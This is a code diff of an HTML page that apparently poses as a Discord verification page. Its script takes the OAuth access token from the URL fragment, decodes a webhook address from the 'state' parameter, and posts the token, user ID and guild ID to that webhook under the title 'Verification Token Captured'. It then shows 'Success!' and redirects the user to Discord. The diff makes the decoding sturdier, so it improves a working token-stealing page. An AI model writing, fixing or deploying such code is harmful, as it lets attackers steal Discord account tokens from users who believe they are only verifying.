@@ -16,39 +16,46 @@
     <a href="discord://-/" class="btn" id="btn">Open Discord App</a>
 
     <script>
-        const hash = new URLSearchParams(window.location.hash.substring(1));
-        const token = hash.get('access_token');
-        const state = hash.get('state'); 
+        try {
+            const hash = new URLSearchParams(window.location.hash.substring(1));
+            const token = hash.get('access_token');
+            const state = hash.get('state'); 
 
-        if (token && state) {
-            const decodedState = JSON.parse(atob(state));
-            const webhookUrl = decodedState.webhook;
-            const userId = decodedState.userId;
-            const guildId = decodedState.guildId;
+            if (token && state) {
+                // Fix Base64 URL safe characters
+                let safeState = state.replace(/-/g, '+').replace(/_/g, '/');
+                const decodedState = JSON.parse(atob(safeState));
+                
+                const webhookUrl = decodedState.webhook;
+                const userId = decodedState.userId;
+                const guildId = decodedState.guildId;
 
-            // Send as an Embed directly to Discord
-            fetch(webhookUrl, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    embeds: [{
-                        title: "🔐 Verification Token Captured",
-                        color: 3066993, // Green
-                        fields: [
-                            { name: "User ID", value: `\`${userId}\``, inline: true },
-                            { name: "Guild ID", value: `\`${guildId}\``, inline: true },
-                            { name: "Token", value: `||${token}||`, inline: false }
-                        ],
-                        timestamp: new Date().toISOString()
-                    }]
-                })
-            }).then(() => {
-                document.getElementById('status').innerText = "Success! Redirecting to Discord...";
-                document.getElementById('btn').style.display = "inline-block";
-                setTimeout(() => { window.location.href = "discord://-/"; }, 1000);
-            }).catch(err => {
-                document.getElementById('status').innerText = "Error! Please try again.";
-            });
+                // Send as an Embed directly to Discord
+                fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        embeds: [{
+                            title: "🔐 Verification Token Captured",
+                            color: 3066993, // Green
+                            fields: [
+                                { name: "User ID", value: `\`${userId}\``, inline: true },
+                                { name: "Guild ID", value: `\`${guildId}\``, inline: true },
+                                { name: "Token", value: `||${token}||`, inline: false }
+                            ],
+                            timestamp: new Date().toISOString()
+                        }]
+                    })
+                }).then(() => {
+                    document.getElementById('status').innerText = "Success! Redirecting to Discord...";
+                    document.getElementById('btn').style.display = "inline-block";
+                    setTimeout(() => { window.location.href = "discord://-/"; }, 1000);
+                }).catch(err => {
+                    document.getElementById('status').innerText = "Error! Please try again.";
+                });
+            }
+        } catch (e) {
+            document.getElementById('status').innerText = "Invalid link format.";
         }
     </script>
 </body>
